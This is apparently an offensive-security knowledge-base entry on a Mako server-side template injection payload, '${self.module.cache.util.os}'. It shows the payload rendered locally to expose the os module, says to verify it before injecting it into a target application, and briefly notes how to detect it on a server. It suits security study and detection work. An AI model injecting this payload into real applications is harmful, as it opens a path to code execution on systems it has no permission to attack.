---
id: a0e29481-da3c-4257-8b7b-27a847c162bc
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:40.091551+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - linux
  - python
tags:
  - ssti
  - mako
  - test
validated: true
---

# Test-Mako-Payload-OS-Module-Render

## Code

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## Description

This code tests the rendering of a Mako template payload that accesses the 'os' module through internal cache utilities, printing its path. It simulates server-side execution to validate payloads for SSTI exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; uses Mako's Template class with hardcoded payload. | N/A |

## Usage

Execute in a local Python environment with Mako installed to verify the payload `${self.module.cache.util.os}` before injecting it into a target application. Helps ensure compatibility and correct syntax.

## Detection

N/A (local testing code); on server, detect via logs of template cache accesses or module path disclosures in responses.

## Related

- [[procedures/Mako-SSTI-OS-Information-Gathering]]
